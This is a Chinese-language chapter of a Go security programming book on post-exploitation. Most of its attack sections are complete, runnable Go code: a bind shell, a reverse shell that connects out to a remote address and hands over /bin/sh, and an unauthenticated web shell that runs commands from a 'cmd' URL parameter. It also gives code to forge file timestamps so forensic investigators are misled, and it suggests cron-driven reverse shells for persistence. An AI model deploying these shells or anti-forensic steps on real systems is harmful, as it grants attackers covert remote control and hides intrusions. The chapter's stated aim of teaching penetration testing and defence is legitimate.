# 第十三章：后渗透

后渗透指的是渗透测试的阶段，其中一台机器已经被利用并且可以执行代码。主要任务通常是保持持久性，以便您可以保持连接活动或留下重新连接的方式。本章涵盖了一些常见的持久性技术；即绑定 shell、反向绑定 shell 和 Web shell。我们还将研究交叉编译，在从单个主机编译不同操作系统的 shell 时非常有帮助。

后渗透阶段的其他目标包括查找敏感数据，对文件进行更改，并隐藏您的踪迹，以便取证调查人员无法找到证据。您可以通过更改文件的时间戳、修改权限、禁用 shell 历史记录和删除日志来掩盖您的踪迹。本章涵盖了一些查找有趣文件和掩盖踪迹的技术。

第四章，*取证*，与本章密切相关，因为进行取证调查与探索新被利用的机器并无太大不同。两项任务都是关于了解系统上有什么并找到有趣的文件。同样，第五章，*数据包捕获和注入*，对于从被利用的主机进行网络分析非常有用。在这个阶段，诸如查找大文件或查找最近修改的文件等工具也非常有用。请参考第四章，*取证*，和第五章，*数据包捕获和注入*，以获取更多可在后渗透阶段使用的示例。

后渗透阶段涵盖了各种任务，包括提权、枢纽、窃取或销毁数据，以及主机和网络分析。由于范围如此广泛，并且根据您所利用的系统类型而变化，本章重点关注应该在大多数情况下有用的一系列主题。

在进行这些练习时，尝试从攻击者的角度看待事物。在处理示例时采用这种心态将有助于您了解如何更好地保护您的系统。

在这一章中，我们将涵盖以下主题：

+   交叉编译

+   绑定 shell

+   反向绑定 shell

+   Web shell

+   查找具有写权限的文件

+   修改文件时间戳

+   修改文件权限

+   修改文件所有权

# 交叉编译

交叉编译是 Go 提供的一个非常易于使用的功能。如果您正在 Linux 机器上执行渗透测试，并且需要编译一个在您已经攻陷的 Windows 机器上运行的自定义反向 shell，这将非常有用。

您可以针对多种架构和操作系统，而您需要做的只是修改一个环境变量。无需任何额外的工具或编译器。Go 中已经内置了一切。

只需更改`GOARCH`和`GOOS`环境变量以匹配您所需的构建目标。您可以构建 Windows、Mac、Linux 等系统。您还可以为主流的 32 位和 64 位桌面处理器以及树莓派等设备的 ARM 和 MIPS 构建。

截至目前，`GOARCH`的可能值如下：

| `386` | `amd64` |
| --- | --- |
| `amd64p32` | `arm` |
| `armbe` | `arm64` |
| `arm64be` | `ppc64` |
| `ppc64le` | `mips` |
| `mipsle` | `mips64` |
| `mips64le` | `mips64p32` |
| `mips64p32le` | `ppc` |
| `s390` | `s390x` |
| `sparc` | `sparc64` |

`GOOS`的选项如下：

| `android` | `darwin` |
| --- | --- |
| `dragonfly` | `freebsd` |
| `linux` | `nacl` |
| `netbsd` | `openbsd` |
| `plan9` | `solaris` |
| `windows` | `zos` |

请注意，并非每种架构都可以与每种操作系统一起使用。请参考 Go 官方文档([`golang.org/doc/install/source#environment`](https://golang.org/doc/install/source#environment))，了解可以组合哪些架构和操作系统。

如果你的目标是 ARM 平台，你可以通过设置`GOARM`环境变量来指定 ARM 版本。系统会自动选择一个合理的默认值，建议你不要更改。在撰写本文时，可能的`GOARM`值为`5`、`6`和`7`。

在 Windows 中，在命令提示符中设置环境变量，如下所示：

```go
Set GOOS=linux
Set GOARCH=amd64
go build myapp
```

在 Linux/Mac 中，你也可以以多种方式设置环境变量，但你可以像这样为单个构建命令指定它：

```go
GOOS=windows GOARCH=amd64 go build mypackage  
```

在[`golang.org/doc/install/source#environment`](https://golang.org/doc/install/source#environment)了解更多关于环境变量和交叉编译的内容。

这种交叉编译方法是在 Go 1.5 中引入的。在那之前，Go 开发人员提供了一个 shell 脚本，但现在不再支持，它被存档在[`github.com/davecheney/golang-crosscompile/tree/archive`](https://github.com/davecheney/golang-crosscompile/tree/archive)。

# 创建绑定 shell

绑定 shell 是绑定到端口并监听连接并提供 shell 的程序。每当收到连接时，它运行一个 shell，比如 Bash，并将标准输入、输出和错误处理传递给远程连接。它可以永久监听并为多个传入连接提供 shell。

绑定 shell 在你想要为机器添加持久访问时非常有用。你可以运行绑定 shell，然后断开连接，或者通过远程代码执行漏洞将绑定 shell 注入内存。

绑定 shell 的最大问题是防火墙和 NAT 路由可能会阻止直接远程访问计算机。传入连接通常会被阻止或以一种阻止连接到绑定 shell 的方式路由。因此，通常使用反向绑定 shell。下一节将介绍反向绑定 shell。

在 Windows 上编译这个示例，结果为 1,186 字节。考虑到一些用 C/Assembly 编写的 shell 可能不到 100 字节，这可能被认为是相对较大的。如果你要利用一个应用程序，你可能只有非常有限的空间来注入绑定 shell。你可以通过省略`log`包、删除可选的命令行参数和忽略错误来使示例更小。

可以使用 TLS 来替代明文，方法是用`tls.Listen()`替换`net.Listen()`。第六章，*密码学*，有一个 TLS 客户端和服务器的示例。

接口是 Go 语言的一个强大特性，这里通过读取器和写入器接口展示了它的便利性。满足读取器和写入器接口的唯一要求是分别为该类型实现`.Read()`和`.Write()`函数。在这里，网络连接实现了`Read()`和`Write()`函数，`exec.Command`也是如此。由于它们实现的共享接口，我们可以轻松地将读取器和写入器接口绑定在一起。

在下一个示例中，我们将看看如何为 Linux 创建一个使用内置的`/bin/sh` shell 的绑定 shell。它将绑定并监听连接，为任何连接提供 shell：

```go
// Call back to a remote server and open a shell session
package main

import (
   "fmt"
   "log"
   "net"
   "os"
   "os/exec"
)

var shell = "/bin/sh"

func main() {
   // Handle command line arguments
   if len(os.Args) != 2 {
      fmt.Println("Usage: " + os.Args[0] + " <bindAddress>")
      fmt.Println("Example: " + os.Args[0] + " 0.0.0.0:9999")
      os.Exit(1)
   }

   // Bind socket
   listener, err := net.Listen("tcp", os.Args[1])
   if err != nil {
      log.Fatal("Error connecting. ", err)
   }
   log.Println("Now listening for connections.")

   // Listen and serve shells forever
   for {
      conn, err := listener.Accept()
      if err != nil {
         log.Println("Error accepting connection. ", err)
      }
      go handleConnection(conn)
   }

}

// This function gets executed in a thread for each incoming connection
func handleConnection(conn net.Conn) {
   log.Printf("Connection received from %s. Opening shell.", 
   conn.RemoteAddr())
   conn.Write([]byte("Connection established. Opening shell.\n"))

   // Use the reader/writer interface to connect the pipes
   command := exec.Command(shell)
   command.Stdin = conn
   command.Stdout = conn
   command.Stderr = conn
   command.Run()

   log.Printf("Shell ended for %s", conn.RemoteAddr())
} 
```

# 创建反向绑定 shell

反向绑定 shell 克服了防火墙和 NAT 的问题。它不是监听传入连接，而是向远程服务器（你控制并监听的服务器）拨号。当你在自己的机器上收到连接时，你就有了一个在防火墙后面的计算机上运行的 shell。

这个示例使用明文 TCP 套接字，但你可以很容易地用`tls.Dial()`替换`net.Dial()`。第六章，*密码学*，有 TLS 客户端和服务器的示例，如果你想修改这些示例来使用 TLS。

```go
// Call back to a remote server and open a shell session
package main

import (
   "fmt"
   "log"
   "net"
   "os"
   "os/exec"
)

var shell = "/bin/sh"

func main() {
   // Handle command line arguments
   if len(os.Args) < 2 {
      fmt.Println("Usage: " + os.Args[0] + " <remoteAddress>")
      fmt.Println("Example: " + os.Args[0] + " 192.168.0.27:9999")
      os.Exit(1)
   }

   // Connect to remote listener
   remoteConn, err := net.Dial("tcp", os.Args[1])
   if err != nil {
      log.Fatal("Error connecting. ", err)
   }
   log.Println("Connection established. Launching shell.")

   command := exec.Command(shell)
   // Take advantage of reader/writer interfaces to tie inputs/outputs
   command.Stdin = remoteConn
   command.Stdout = remoteConn
   command.Stderr = remoteConn
   command.Run()
} 
```

# 创建 Web shell

Web shell 类似于绑定 shell，但是它不是作为原始 TCP 套接字进行监听和通信，而是作为 HTTP 服务器进行监听和通信。这是一种创建对机器持久访问的有用方法。

Web shell 可能是必要的一个原因是防火墙或其他网络限制。HTTP 流量可能会与其他流量有所不同。有时，`80`和`443`端口是防火墙允许的唯一端口。一些网络可能会检查流量，以确保只有 HTTP 格式的请求被允许通过。

请记住，使用纯 HTTP 意味着流量可以以纯文本形式记录。可以使用 HTTPS 加密流量，但 SSL 证书和密钥将驻留在服务器上，因此服务器管理员将可以访问它。要使此示例使用 SSL，只需将`http.ListenAndServe()`更改为`http.ListenAndServeTLS()`。第九章中提供了此示例，*Web 应用程序*。

Web shell 的便利之处在于您可以使用任何 Web 浏览器和命令行工具，例如`curl`或`wget`。您甚至可以使用`netcat`并手动创建 HTTP 请求。缺点是您没有真正的交互式 shell，并且一次只能发送一个命令。如果使用分号分隔多个命令，可以在一个字符串中运行多个命令。

您可以像这样手动创建`netcat`或自定义 TCP 客户端的 HTTP 请求：

```go
GET /?cmd=whoami HTTP/1.0\n\n  
```

这将类似于由 Web 浏览器创建的请求。例如，如果您运行`webshell localhost:8080`，您可以访问端口`8080`上的 URL，并使用`http://localhost:8080/?cmd=df`运行命令。

请注意，`/bin/sh` shell 命令适用于 Linux 和 Mac。Windows 使用`cmd.exe`命令提示符。在 Windows 中，您可以启用 Windows 子系统并从 Windows 商店安装 Ubuntu，以在不安装虚拟机的情况下在 Linux 环境中运行所有这些 Linux 示例。

在下一个示例中，Web shell 创建一个简单的 Web 服务器，通过 HTTP 监听请求。当它收到请求时，它会查找名为`cmd`的`GET`查询。它将执行一个 shell，运行提供的命令，并将结果作为 HTTP 响应返回：

```go
package main

import (
   "fmt"
   "log"
   "net/http"
   "os"
   "os/exec"
)

var shell = "/bin/sh"
var shellArg = "-c"

func main() {
   if len(os.Args) != 2 {
      fmt.Printf("Usage: %s <listenAddress>\n", os.Args[0])
      fmt.Printf("Example: %s localhost:8080\n", os.Args[0])
      os.Exit(1)
   }

   http.HandleFunc("/", requestHandler)
   log.Println("Listening for HTTP requests.")
   err := http.ListenAndServe(os.Args[1], nil)
   if err != nil {
      log.Fatal("Error creating server. ", err)
   }
}

func requestHandler(writer http.ResponseWriter, request *http.Request) {
   // Get command to execute from GET query parameters
   cmd := request.URL.Query().Get("cmd")
   if cmd == "" {
      fmt.Fprintln(
         writer,
         "No command provided. Example: /?cmd=whoami")
      return
   }

   log.Printf("Request from %s: %s\n", request.RemoteAddr, cmd)
   fmt.Fprintf(writer, "You requested command: %s\n", cmd)

   // Run the command
   command := exec.Command(shell, shellArg, cmd)
   output, err := command.Output()
   if err != nil {
      fmt.Fprintf(writer, "Error with command.\n%s\n", err.Error())
   }

   // Write output of command to the response writer interface
   fmt.Fprintf(writer, "Output: \n%s\n", output)
} 
```

# 查找可写文件

一旦您获得对系统的访问权限，您就会开始探索。通常，您会寻找提升权限或保持持久性的方法。寻找持久性方法的一个好方法是识别哪些文件具有写权限。

您可以查看文件权限设置，看看您或其他人是否具有写权限。您可以明确寻找`777`等模式，但更好的方法是使用位掩码，专门查看写权限位。

权限由几个位表示：用户权限，组权限，最后是每个人的权限。`0777`权限的字符串表示看起来像这样：`-rwxrwxrwx`。我们感兴趣的位是给每个人写权限的位，由`--------w-`表示。

第二位是我们关心的唯一位，因此我们将使用按位与运算符将文件的权限与`0002`进行掩码。如果该位已设置，它将保持为唯一设置的位。如果关闭，则保持关闭，整个值将为`0`。要检查组或用户的写位，可以分别使用按位与运算符`0020`和`0200`。

要在目录中进行递归搜索，Go 提供了标准库中的`path/filepath`包。此函数只需一个起始目录和一个函数。它对找到的每个文件执行该函数。它期望的函数实际上是一个特别定义的类型。它的定义如下：

```go
type WalkFunc func(path string, info os.FileInfo, err error) error  
```

只要创建一个与此格式匹配的函数，您的函数就与`WalkFunc`类型兼容，并且可以在`filepath.Walk()`函数中使用。

在下一个示例中，我们将遍历一个起始目录并检查每个文件的文件权限。我们还将涵盖子目录。任何当前用户可写的文件都将打印到标准输出：

```go
package main

import (
   "fmt"
   "log"
   "os"
   "path/filepath"
)

func main() {
   if len(os.Args) != 2 {
      fmt.Println("Recursively look for files with the " + 
         "write bit set for everyone.")
      fmt.Println("Usage: " + os.Args[0] + " <path>")
      fmt.Println("Example: " + os.Args[0] + " /var/log")
      os.Exit(1)
   }
   dirPath := os.Args[1]

   err := filepath.Walk(dirPath, checkFilePermissions)
   if err != nil {
      log.Fatal(err)
   }
}

func checkFilePermissions(
   path string,
   fileInfo os.FileInfo,
   err error,
) error {
   if err != nil {
      log.Print(err)
      return nil
   }

   // Bitwise operators to isolate specific bit groups
   maskedPermissions := fileInfo.Mode().Perm() & 0002
   if maskedPermissions == 0002 {
      fmt.Println("Writable: " + fileInfo.Mode().Perm().String() + 
         " " + path)
   }

   return nil
} 
```

# 更改文件时间戳

以相同的方式，您可以修改文件权限，也可以修改时间戳，使其看起来像是在过去或未来修改过。这对于掩盖您的行踪并使其看起来像是很长时间没有被访问的文件，或者设置为将来的日期以混淆取证人员可能很有用。Go `os`包包含了修改文件的工具。

在下一个示例中，文件的时间戳被修改以看起来像是在未来修改过。您可以调整`futureTime`变量，使文件看起来已经修改到任何特定时间。该示例通过在当前时间上添加 50 小时 15 分钟来提供相对时间，但您也可以指定绝对时间：

```go
package main

import (
   "fmt"
   "log"
   "os"
   "time"
)

func main() {
   if len(os.Args) != 2 {
      fmt.Printf("Usage: %s <filename>", os.Args[0])
      fmt.Printf("Example: %s test.txt", os.Args[0])
      os.Exit(1)
   }

   // Change timestamp to a future time
   futureTime := time.Now().Add(50 * time.Hour).Add(15 * time.Minute)
   lastAccessTime := futureTime
   lastModifyTime := futureTime
   err := os.Chtimes(os.Args[1], lastAccessTime, lastModifyTime)
   if err != nil {
      log.Println(err)
   }
} 
```

# 更改文件权限

更改文件权限以便以后可以从低权限用户访问文件也可能很有用。该示例演示了如何使用`os`包更改文件权限。您可以使用`os.Chmod()`函数轻松更改文件权限。

该程序命名为`chmode.go`，以避免与大多数系统提供的默认`chmod`程序发生冲突。它具有与`chmod`相同的基本功能，但没有任何额外功能。

`os.Chmod()`函数很简单，但必须提供`os.FileMode`类型。`os.FileMode`类型只是一个`uint32`类型，因此您可以提供一个`uint32`文字（硬编码数字），或者您必须确保您提供的文件模式值被转换为`os.FileMode`类型。在这个示例中，我们将从命令行提供的字符串值（例如，`"777"`）转换为无符号整数。我们将告诉`strconv.ParseUint()`将其视为 8 进制数而不是 10 进制数。我们还为`strconv.ParseUint()`提供了一个 32 的参数，以便我们得到一个 32 位的数字而不是 64 位的数字。在我们从字符串值获得一个无符号 32 位整数之后，我们将其转换为`os.FileMode`类型。这就是标准库中`os.FileMode`的定义方式：

```go
type FileMode uint32  
```

在下一个示例中，文件的权限将更改为作为命令行参数提供的值。它类似于 Linux 中的`chmod`程序，并以八进制格式接受权限：

```go
package main

import (
   "fmt"
   "log"
   "os"
   "strconv"
)

func main() {
   if len(os.Args) != 3 {
      fmt.Println("Change the permissions of a file.")
      fmt.Println("Usage: " + os.Args[0] + " <mode> <filepath>")
      fmt.Println("Example: " + os.Args[0] + " 777 test.txt")
      fmt.Println("Example: " + os.Args[0] + " 0644 test.txt")
      os.Exit(1)
   }
   mode := os.Args[1]
   filePath := os.Args[2]

   // Convert the mode value from string to uin32 to os.FileMode
   fileModeValue, err := strconv.ParseUint(mode, 8, 32)
   if err != nil {
      log.Fatal("Error converting permission string to octal value. ", 
         err)
   }
   fileMode := os.FileMode(fileModeValue)

   err = os.Chmod(filePath, fileMode)
   if err != nil {
      log.Fatal("Error changing permissions. ", err)
   }
   fmt.Println("Permissions changed for " + filePath)
} 
```

# 更改文件所有权

该程序将获取提供的文件并更改用户和组所有权。这可以与查找您有权限修改的文件的示例一起使用。

Go 在标准库中提供了`os.Chown()`，但它不接受用户和组名称的字符串值。用户和组必须以整数 ID 值提供。幸运的是，Go 还带有一个`os/user`包，其中包含根据名称查找 ID 的函数。这些函数是`user.Lookup()`和`user.LookupGroup()`。

您可以使用`id`、`whoami`和`groups`命令在 Linux/Mac 上查找自己的用户和组信息。

请注意，这在 Windows 上不起作用，因为所有权的处理方式不同。以下是此示例的代码实现：

```go
package main

import (
   "fmt"
   "log"
   "os"
   "os/user"
   "strconv"
)

func main() {
   // Check command line arguments
   if len(os.Args) != 4 {
      fmt.Println("Change the owner of a file.")
      fmt.Println("Usage: " + os.Args[0] + 
         " <user> <group> <filepath>")
      fmt.Println("Example: " + os.Args[0] +
         " dano dano test.txt")
      fmt.Println("Example: sudo " + os.Args[0] + 
         " root root test.txt")
      os.Exit(1)
   }
   username := os.Args[1]
   groupname := os.Args[2]
   filePath := os.Args[3]

   // Look up user based on name and get ID
   userInfo, err := user.Lookup(username)
   if err != nil {
      log.Fatal("Error looking up user "+username+". ", err)
   }
   uid, err := strconv.Atoi(userInfo.Uid)
   if err != nil {
      log.Fatal("Error converting "+userInfo.Uid+" to integer. ", err)
   }

   // Look up group name and get group ID
   group, err := user.LookupGroup(groupname)
   if err != nil {
      log.Fatal("Error looking up group "+groupname+". ", err)
   }
   gid, err := strconv.Atoi(group.Gid)
   if err != nil {
      log.Fatal("Error converting "+group.Gid+" to integer. ", err)
   }

   fmt.Printf("Changing owner of %s to %s(%d):%s(%d).\n",
      filePath, username, uid, groupname, gid)
   os.Chown(filePath, uid, gid)
} 
```

# 摘要

阅读完本章后，您现在应该对攻击的后期利用阶段有了高层次的理解。通过实例的操作并扮演攻击者的心态，您应该对如何保护您的文件和网络有了更好的理解。这主要是关于持久性和信息收集。您还可以使用被攻击的机器执行来自第十一章 *主机发现和枚举*的所有示例。

绑定 shell、反向绑定 shell 和 Web shell 是攻击者用来保持持久性的技术示例。即使你永远不需要使用绑定 shell，了解它以及攻击者如何使用它是很重要的，如果你想识别恶意行为并保持系统安全。你可以使用第十一章中的端口扫描示例，*主机发现和枚举*，来搜索具有监听绑定 shell 的机器。你可以使用第五章中的数据包捕获和注入来查找传出的反向绑定 shell。

找到可写文件可以为你提供浏览文件系统所需的工具。`Walk()`函数演示非常强大，可以适应许多用例。你可以轻松地将其调整为搜索具有不同特征的文件。例如，也许你想将搜索范围缩小到查找由 root 拥有但对你也可写的文件，或者你想找到特定扩展名的文件。

你刚刚获得访问权限的机器上还有什么其他东西会吸引你的注意吗？你能想到其他任何重新获得访问权限的方法吗？Cron 作业是一种可以执行代码的方法，如果你找到一个执行你有写权限的脚本的 cron 作业。如果你能修改一个 cron 脚本，那么你可能会每天都有一个反向 shell 呼叫你，这样你就不必维持一个活跃的会话，使用像`netstat`这样的工具更容易找到已建立的连接。

记住，无论何时进行测试或执行渗透测试都要负责任。即使你有完整的范围，你也必须理解你所采取的任何行动可能带来的后果。例如，如果你为客户执行渗透测试，并且你有完整的范围，你可能会在生产系统上发现一个漏洞。你可能考虑安装一个绑定 shell 后门来证明你可以保持持久性。如果我们考虑一个面向互联网的生产服务器，将一个绑定 shell 开放给整个互联网而没有加密和密码是非常不负责任的。如果你对某些软件或某些命令的后果感到不确定，不要害怕向有经验的人求助。

在下一章中，我们将回顾你在本书中学到的主题。我将提供一些关于使用 Go 进行安全性的思考，希望你能从本书中获得，并且我们将讨论接下来该做什么以及在哪里寻求帮助。我们还将再次反思使用本书信息涉及的法律、道德和技术边界。
